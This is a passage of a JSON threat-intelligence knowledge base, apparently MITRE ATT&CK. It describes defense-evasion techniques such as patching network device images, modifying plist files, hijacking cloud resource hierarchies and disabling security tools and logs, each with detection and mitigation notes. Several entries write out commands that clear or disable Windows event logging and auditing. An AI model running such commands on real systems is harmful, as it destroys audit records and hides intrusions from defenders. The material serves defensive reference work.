overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.  Adding new capabilities for the adversary’s purpose include Keylogging, Multi-hop Proxy, and Port Knocking.\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot. \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.","detection":"Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a>\n\nMany vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#13\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</a>","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."},{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"},{"id":"M1043","name":"Credential Access Protection","description":"Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#40\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Credentials Management)</a>"},{"id":"M1045","name":"Code Signing","description":"Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS)</a>"},{"id":"M1046","name":"Boot Integrity","description":"Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a>"}]},{"id":"T1601.002","name":"Downgrade System Image","description":"Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a>\n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption.  Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.","detection":"Many embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because image downgrade may be used in conjunction with Patch System Image, it may be appropriate to also verify the integrity of the vendor provided operating system image file.","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."},{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"},{"id":"M1043","name":"Credential Access Protection","description":"Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#40\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Credentials Management)</a>"},{"id":"M1045","name":"Code Signing","description":"Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS)</a>"},{"id":"M1046","name":"Boot Integrity","description":"Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a>"}]}]},{"id":"T1647","name":"Plist File Modification","description":"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format. <a href=\"https://fileinfo.com/extension/plist\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: fileinfo plist file description)</a> \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications).\n\nFor example, adversaries can add a malicious application path to the <code>~/Library/Preferences/com.apple.dock.plist</code> file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application’s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via Dynamic Linker Hijacking. <a href=\"https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wardle chp2 persistence)</a> <a href=\"https://www.welivesecurity.com/wp-content/uploads/200x/white-papers/osx_flashback.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: eset_osx_flashback)</a>","detection":"Monitor for common command-line editors used to modify plist files located in auto-run locations, such as <code>\\~/LaunchAgents</code>, <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>, and an application's <code>Info.plist</code>. \n\nMonitor for plist file modification immediately followed by code execution from <code>\\~/Library/Scripts</code> and <code>~/Library/Preferences</code>. Also, monitor for significant changes to any path pointers in a modified plist.\n\nIdentify new services executed from plist modified in the previous user's session.","platforms":["macOS"],"dataSources":["Command: Command Execution","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Ensure applications are using Apple's developer guidance which enables hardened runtime. <a href=\"https://developer.apple.com/documentation/security/hardened_runtime\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Doco Hardened Runtime)</a>"}],"subTechniques":[]},{"id":"T1666","name":"Modify Cloud Resource Hierarchy","description":"Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.  \n\nIaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group. <a href=\"https://docs.aws.amazon.com/organizations/latest/userguide/orgs_getting-started_concepts.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Organizations)</a> <a href=\"https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-setup-guide/organize-resources\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Resources)</a>\n\nAdversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant. <a href=\"https://www.microsoft.com/en-us/security/blog/2023/09/14/peach-sandstorm-password-spray-campaigns-enable-intelligence-collection-at-high-value-targets/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Peach Sandstorm 2023)</a> <a href=\"https://techcommunity.microsoft.com/t5/microsoft-365-defender-blog/hunt-for-compromised-azure-subscriptions-using-microsoft/ba-p/3607121\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Subscription Hijacking 2022)</a>\n\nIn AWS environments, adversaries with appropriate permissions in a given account may call the <code>LeaveOrganization</code> API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the <code>CreateAccount</code> API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies. <a href=\"https://d1.awsstatic.com/onedam/marketing-channels/website/aws/en_US/events/approved/reinforce-2025/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS re Inforce Trust Mod)</a>","detection":"","platforms":["IaaS"],"dataSources":["Cloud Service: Cloud Service Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions to add, delete, or modify resource groups to only those required."},{"id":"M1047","name":"Audit","description":"Periodically audit resource groups in the cloud management console to ensure that only expected items exist, especially close to the top of the hierarchy (e.g., AWS accounts and Azure subscriptions). Typically, top-level accounts (such as the AWS management account) should not contain any workloads or resources. <a href=\"https://docs.aws.amazon.com/organizations/latest/userguide/orgs_best-practices_mgmt-acct.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Management Account Best Practices)</a>"},{"id":"M1054","name":"Software Configuration","description":"In Azure environments, consider setting a policy to block subscription transfers. <a href=\"https://learn.microsoft.com/en-us/azure/cost-management-billing/manage/manage-azure-subscription-policy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Subscription Policies)</a> In AWS environments, consider using Service Control Policies to prevent the use of the <code>LeaveOrganization</code> API call. <a href=\"https://reinforce.awsevents.com/content/dam/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS RE:Inforce Threat Detection 2024)</a>"}],"subTechniques":[]},{"id":"T1685","name":"Disable or Modify Tools","description":"Adversaries may disable, degrade, or tamper with security tools or applications (e.g., endpoint detection and response (EDR) tools, intrusion detection systems (IDS), antivirus, logging agents, sensors, etc.) to impair or reduce visibility of defensive capabilities. This may include stopping specific services, killing processes, modifying or deleting tool configuration files and Registry keys, or preventing tools from updating. This may also include impairing defenses more broadly by disrupting preventative, detection, and response mechanisms across host, network, and cloud environments. <a href=\"https://cdn.logic-control.com/docs/scadafence/Anatomy-Of-A-Targeted-Ransomware-Attack-WP.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SCADAfence_ransomware)</a> \n\nIn addition to directly targeting tools, adversaries may block or manipulate indicators and telemetry used for detection. This includes maliciously disabling or redirecting sensors such as Event Tracing for Windows (ETW), modifying event log configurations (e.g., redirecting Security logs), or interfering with logging pipelines and forwarding mechanisms (e.g., SIEM ingestion). <a href=\"https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Backdoor:Win32/Lamin.A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Lamin Sept 2017)</a> <a href=\"https://blog.palantir.com/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ETW Palantir)</a>\n\nMore advanced techniques include leveraging legitimate drivers or debugging mechanisms to render tools non-functional, bypassing anti-tampering protections, and targeting specific defenses such as Sysmon or cloud monitoring agents. Adversaries may also disrupt broader defensive operations, including update mechanisms, logging infrastructure (e.g., syslog), or event aggregation, further degrading an organization’s ability to detect and respond to malicious activity. <a href=\"https://www.sentinelone.com/labs/fin7-reboot-cybercrime-gang-enhances-ops-with-new-edr-bypasses-and-automated-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cocomazzi FIN7 Reboot)</a>","detection":"","platforms":["Containers","ESXi","IaaS","Linux","macOS","Network Devices","Windows"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with security services."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering with security services."},{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate, especially regarding the execution of tools outside of the organization's security policies (such as rootkit removal tools) that have been abused to impair system defenses. Ensure that only approved security applications are used and running on enterprise systems."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider removing previous versions of tools that are unnecessary to the environment when possible."},{"id":"M1047","name":"Audit","description":"Periodically verify that tools are functioning appropriately – for example, that all expected hosts with EDRs or monitoring agents are checking in to the central console. Check EDRs to ensure that no unexpected exclusion paths have been added. In Microsoft Defender for Endpoint, exclusions can be reviewed with the <code>Get-MpPreference</code> cmdlet. <a href=\"https://medium.com/codex/my-learnings-on-microsoft-defender-for-endpoint-and-exclusions-ddacf2fdd047\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CodeX Microsoft Defender 2021)</a>"},{"id":"M1054","name":"Software Configuration","description":"Consider automatically relaunching forwarding mechanisms at recurring intervals (ex: temporal, on-logon, etc.) as well as applying appropriate change management to firewall rules and other related system configurations."}],"subTechniques":[{"id":"T1685.001","name":"Disable or Modify Windows Event Log","description":"Adversaries may disable or modify the Windows Event Log to limit data that can be leveraged for detections and audits. Windows Event Log records user and system activity such as login attempts and process creation. <a href=\"https://www.coretechnologies.com/blog/windows-services/eventlog/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EventLog_Core_Technologies)</a> This data is used by security tools and analysts to generate detections. \n\nThe EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings. <a href=\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/audit-policy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Audit Policy)</a> <a href=\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/advanced-security-audit-policy-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Adv Security Settings)</a> <code>auditpol.exe</code> may also be used to set audit policies. <a href=\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft auditpol)</a>\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service -Name EventLog</code>). Additionally, the service may be disabled by modifying the \"Start\" value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect. <a href=\"https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1562-impair-defenses/disable-windows-event-logging\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Disable_Win_Event_Logging)</a> <a href=\"https://ptylu.github.io/content/report/report.html?report=25\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: disable_win_evt_logging)</a>\n\nThere are several ways to disable the EventLog service via registry key modification. Without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog. <a href=\"https://web.archive.org/web/20211107115646/https://twitter.com/klinix5/status/1457316029114327040\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: winser19_file_overwrite_bug_twitter)</a> With Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\"Account Logon\" /success:disable /failure:disable</code> turns off auditing for the Account Logon category. <a href=\"https://strontic.github.io/xcyclopedia/library/auditpol.exe-214E0EA1F7F7C27C82D23F183F9D23F1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: auditpol.exe_STRONTIC)</a> To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>. <a href=\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: T1562.002_redcanaryco)</a>","detection":"","platforms":["Windows"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with logging."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with logging or deleting or modifying .evtx logging files. Ensure .evtx files, which are located at <code>C:\\Windows\\system32\\Winevt\\Logs</code> <a href=\"https://forensicswiki.xyz/wiki/index.php?title=Windows_XML_Event_Log_(EVTX)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win_xml_evt_log)</a>, have the proper file permissions for limited, legitimate access and audit policies for detection."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering logging. The addition of the MiniNT registry key disables Event Viewer. <a href=\"https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: def_ev_win_event_logging)</a>"},{"id":"M1047","name":"Audit","description":"Consider periodic review of <code>auditpol</code> settings for Administrator accounts and perform dynamic baselining on SIEM(s) to investigate potential malicious activity. Also ensure that the EventLog service and its threads are properly running."}]},{"id":"T1685.002","name":"Disable or Modify Cloud Log","description":"An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities. \n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality, for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. <a href=\"https://docs.aws.amazon.com/cli/latest/reference/cloudtrail/update-trail.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Cloud Trail)</a> <a href=\"https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/detection__disruption/main.py\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pacu Detection Disruption Module)</a> In Office 365, an adversary may disable logging on mail collection activities for specific users by using the Set-MailboxAuditBypassAssociation cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license. <a href=\"https://www.darkreading.com/threat-intelligence/incident-responders-explore-microsoft-365-attacks-in-the-wild\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dark Reading)</a>","detection":"","platforms":["IaaS","SaaS","Identity Provider","Office Suite"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Configure default account policy to enable logging. Manage policies to ensure only necessary users have permissions to make changes to logging policies."}]},{"id":"T1685.003","name":"Modify or Spoof Tool UI","description":"Adversaries may spoof or manipulate security tool user interfaces (UIs) to falsely indicate tools are functioning normally and delay detection and response. \n\nAdversaries may present misleading or falsified security tool interfaces (UIs) that display normal or healthy status indicators, even when underlying security tools have been disabled, degraded, or otherwise tampered with. Security tools typically provide visibility into system health, alerting, and operational status; by misrepresenting this information, adversaries can undermine defender trust in these signals and obscure the true security posture of the system. \n\nThis behavior is often used in conjunction with efforts to disable or modify tools, where adversaries first impair the functionality of defenses (e.g., EDR, logging agents) and then replace or mimic their interfaces to conceal the loss of visibility. By maintaining the appearance of normal operations, such as showing active protection, successful updates, or absence of threats, adversaries can delay investigation and response, enabling continued malicious activity. \n\nFor example, adversaries may display a fake Windows Security interface or system tray icon indicating a “protected” or “healthy” state after disabling Windows Defender or related services. <a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackBasta)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application controls to mitigate installation and use of payloads that may be utilized to spoof security alerting."}]},{"id":"T1685.004","name":"Disable or Modify Linux Audit System Log","description":"Adversaries may disable or modify the Linux Audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules. \n\nOften referred to as <code>auditd</code>, this is the name of the daemon used to write events to disk and is governed by the parameters set in the <code>audit.conf</code> configuration file. Two primary ways to configure the log generation rules are through the command line <code>auditctl</code> utility and the file <code>/etc/audit/audit.rules</code>, containing a sequence of <code>auditctl</code> commands loaded at boot time. <a href=\"https://izyknows.medium.com/linux-auditd-for-threat-detection-d06c8b941505\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IzyKnows auditd threat detection 2022)</a> <a href=\"https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Hat Linux Disable or Mod)</a>\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with <code>auditd</code> daemon or use <code>systemctl</code> to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the <code>/etc/audit/audit.rules</code> or <code>audit.conf</code> files to ignore malicious activity. <a href=\"https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Ebury Feb 2014)</a>","detection":"","platforms":["Linux"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have root level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1047","name":"Audit","description":"Routinely check account role permissions to ensure only expected users and roles have permission to modify logging settings.\n\nTo ensure Audit rules can not be modified at runtime, add the <code>auditctl -e 2</code> as the last command in the audit.rules files. Once started, any attempt to change the configuration in this mode will be audited and denied. The configuration can only be changed by rebooting the machine."}]},{"id":"T1685.005","name":"Clear Windows Event Logs","description":"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot. <a href=\"https://ptylu.github.io/content/report/report.html?report=25\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: disable_win_evt_logging)</a>\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within <code>C:\\Windows\\System32\\winevt\\logs\\</code>.","detection":"","platforms":["Windows"],"dataSources":[],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."},{"id":"M1029","name":"Remote Data Storage","description":"Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary."}]},{"id":"T1685.006","name":"Clear Linux or Mac System Logs","description":"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as: <a href=\"https://www.eurovps.com/blog/important-linux-log-files-you-must-be-monitoring/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Logs)</a>\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure or /var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp or /var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs","detection":"","platforms":["Linux","macOS"],"dataSources":[],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."},{"id":"M1029","name":"Remote Data Storage","description":"Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary."}]}]},{"id":"T1686","name":"Disable or Modify System Firewall","description":"Adversaries may disable or modify host-based or network firewalls to impair defensive mechanisms and enable further action. Once an adversary has gathered sufficient privileges, they can tamper with firewall services, policies, or rule sets to remove restrictions on inbound or outbound traffic. For example, this may include turning off firewall profiles, altering existing rules to permit previously blocked ports or protocols, or adding new rules that create covert communication paths (e.g., adding a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port. <a href=\"https://x.com/TheDFIRReport/status/1498657772254240768\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: change_rdp_port_conti)</a>\n\nAdversaries may disable or modify firewalls using different behaviors, depending on the platform. For example, in ESXi, firewall rules may be modified directly via the esxcli 